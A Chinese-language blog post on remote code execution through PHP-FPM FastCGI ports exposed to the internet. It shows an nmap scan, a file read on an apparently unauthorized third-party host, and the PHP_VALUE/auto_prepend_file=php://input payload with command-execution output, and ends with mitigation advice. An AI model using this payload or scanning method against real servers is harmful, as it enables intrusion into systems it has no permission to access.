# PHP FastCGI 的远程利用

Authoer: wofeiwo <wofeiwo_at_gmail_dot_com>

说到FastCGI，大家都知道这是目前最常见的webserver动态脚本执行模型之一。目前基本所有web脚本都基本支持这种模式，甚至有的类型脚本这是唯一的模式（ROR，Python等）。

FastCGI的主要目的就是，将webserver和动态语言的执行分开为两个不同的常驻进程，当webserver接收到动态脚本的请求，就通过fcgi协议将请求通过网络转发给fcgi进程，由fcgi进程进行处理之后，再将结果传送给webserver，然后webserver再输出给浏览器。这种模型由于不用每次请求都重新启动一次cgi，也不用嵌入脚本解析器到webserver中去，因此可伸缩性很强，一旦动态脚本请求量增加，就可以将后端fcgi进程单独设立一个集群提供服务，很大的增加了可维护性，这也是为什么fcgi等类似模式如此流行的原因之一。

然而正是因为这种模式，却也带来了一些问题。例如去年80sec发布的《[nginx文件解析漏洞](http://www.80sec.com/nginx-securit.html)》 实际上就是由于fcgi和webserver对script路径级参数的理解不同出现的问题。除此之外，由于fcgi和webserver是通过网络进行沟通的，因此目前越来越多的集群将fcgi直接绑定在公网上，所有人都可以对其进行访问。这样就意味着，任何人都可以伪装成webserver，让fcgi执行我们想执行的脚本内容。

ok，以上就是背景原理解释，我这里就用我最熟悉的PHP给各位做个例子。

php的fastcgi目前通常叫做FPM。他默认监听的端口是9000端口。我们这里用nmap直接扫描一下：

```shell
nmap -sV -p 9000 --open x.x.x.x/24
```

为什么要用sV？因为9000端口可能还存在其他服务，这里需要借用nmap的指纹识别先帮我们鉴定一下。

```shell
[root@test:~/work/fcgi]#nmap -sV -p 9000 --open 173.xxx.xxx.1/24

Starting Nmap 6.01 ( http://nmap.org ) at 2012-09-14 20:06 EDT
Nmap scan report for abc.net (173.xxx.xxx.111)
Host is up (0.0095s latency).
PORT     STATE SERVICE VERSION
9000/tcp open  ssh     OpenSSH 5.3p1 Debian 3ubuntu7 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:kernel

Nmap scan report for abc.com (173.xxx.xxx.183)
Host is up (0.0096s latency).
PORT     STATE SERVICE    VERSION
9000/tcp open  tcpwrapped

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 256 IP addresses (198 hosts up) scanned in 7.70 seconds
```

随便扫描了一下，运气不错，一个C段有2个开放9000端口的，不过其中一个是被管理员修改的sshd，另一个tcpwrapped，才是我们的目标。

为了做测试，我写了一个fastcgi的客户端程序，直接向对方发起请求。我们利用一个开放的fastcgi能有什么作用？这里和普通的http请求有一点不同，因为webserver为了提供fastcgi一些参数，每次转发请求的时候，会通过`FASTCGI_PARAMS`的包向fcgi进程进行传递。本来这些参数是用户不可控的，但是既然这个fcgi对外开放，那么也就说明我们可以通过设定这些参数，来让我们去做一些原本做不到的事情：

```shell
[root@test:~/work/fcgi]#./fcgi_exp read 173.xxx.xxx.183 9000 /etc/issue
X-Powered-By: PHP/5.3.2-1ubuntu4.9
Content-type: text/html

Ubuntu 10.04.3 LTS \n \l
```

读到了/etc/issue文件，可以看到这是台ubuntu 10.04的机器。那又是怎么实现的呢？其实我们只要在`FASTCGI_PARAMS`中，设定 `DOCUMENT_ROOT`为"/"根目录即可，随后再设置`SCRIPT_FILENAME`为`/etc/issue`。这样，只要我们有权限，我们就可以控制fcgi去读取这台机器上的任意文件了。实际上这并不是读取，**而是用php去执行它**。

既然是执行，所以其实这个漏洞就类似于一个普通的LFI漏洞，如果你知道这台机器上的log路径，或者任何你可以控制内容的文件路径，你就可以执行任意代码了。


到此为止了么？不，如果利用log或者去猜其他文件路径去执行代码，还是不够方便，有没有更为方便的利用方式可以让我执行任意我提交的代码呢？
这里我也找了很多办法，最先想到的是传递env参数过去然后去执行`/proc/self/environ`文件，可惜php-fpm在接收到我的参数值后只是在内存中修改了环境变量，并不会直接改动这个文件。因此没法利用。况且这个方式也不是所有系统都通用。
我们还有一种方法，在我之前写的[《CVE-2012-1823（PHP-CGI RCE）的PoC及技术挑战》](http://zone.wooyun.org/content/151)中，可以通过动态修改`php.ini`中的`auto_prepend_file`的值，去远程执行任意文件。将一个LFI的漏洞变成了RFI，这样可利用空间就大大增加。
fastcgi是否也支持类似的动态修改php的配置？我查了一下资料，发现原本FPM是不支持的，直到[某开发者提交了一个bug](https://bugs.php.net/bug.php?id=51595)，php官方才将[此特性](http://svn.php.net/viewvc/php/php-src/trunk/sapi/fpm/fpm/fpm_main.c?r1=298383&r2=298382&pathrev=298383)Merge到php 5.3.3的源码中去。

通用通过设置`FASTCGI_PARAMS`，我们可以利用`PHP_ADMIN_VALUE`和`PHP_VALUE`去动态修改php的设置。

```ini
env["REQUEST_METHOD"] = "POST"
env["PHP_VALUE"] = "auto_prepend_file = php://input"
env["PHP_ADMIN_VALUE"] = "allow_url_include = On\ndisable_functions = \nsafe_mode = Off"
```

利用执行`php://input`，然后在POST的内容中写入我们的php代码，这样就可以直接执行了。

```shell
[root@test:~/work/fcgi]#./fcgi_exp system 127.0.0.1 9000 /tmp/a.php "id; uname -a"    
X-Powered-By: PHP/5.5.0-dev
Content-type: text/html

uid=500(www) gid=500(www) groups=500(www)
Linux test 2.6.18-308.13.1.el5 #1 SMP Tue Aug 21 17:51:21 EDT 2012 x86_64 x86_64 x86_64 GNU/Linux
```

细心者会注意到这里有些变化，我换了本机做测试。因为开始发现的那台机器php版本是5.3.2，正好低于5.3.3，因此无法利用修改ini设置去执行代码，只能去猜路径。
另一个变化是，我这里去读取`/tmp/a.php`这个php文件，而不是去读取`/etc/issue`。因为在5.3.9开始，php官方加入了一个配置"security.limit_extensions"，默认状态下只允许执行扩展名为".php"的文件。因此你必须找到一个已经存在的php文件。而这个设置是php-fpm.conf里的，无法通过修改ini的配置去覆盖它。如果谁能有更好的办法可以绕过这个限制，请告诉我。

ok，目前为止对php-fpm的所有测试已经结束，我们利用一个对外开放的fcgi进程，已经可以直接获取shell了。各位不如也去研究一下其他fcgi，或许会有更多发现。

如何防止这个漏洞？很简单，千万不要把fcgi接口对公网暴露。同时也希望将来fcgi会有身份认证机制。
